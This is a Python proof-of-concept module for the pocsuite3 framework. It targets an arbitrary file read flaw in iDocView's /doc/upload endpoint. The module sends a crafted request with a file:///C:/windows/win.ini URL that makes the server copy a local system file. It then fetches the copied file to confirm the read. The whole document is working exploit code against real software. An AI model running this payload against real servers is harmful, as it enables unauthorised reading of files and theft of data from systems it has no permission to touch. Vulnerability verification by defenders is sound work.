# _*_ coding:utf-8 _*_
# @Time : 2023/12/18
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class idocview_docupload_fileread(POCBase):
    pocDesc = '''iDocview_doc/upload接口存在任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-18'
    name = 'iDocview_doc/upload接口存在任意文件读取漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=rand.txt'

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
        }

        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'srcUrl' in response.text:
                response_json = response.json()
                filepath = response_json.get('srcUrl')
                if filepath:
                    check_path = self.url + filepath
                    check_response = requests.get(check_path, headers=headers, verify=False)
                    if check_response.status_code == 200:
                        result['VerifyInfo'] = {}



            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(idocview_docupload_fileread)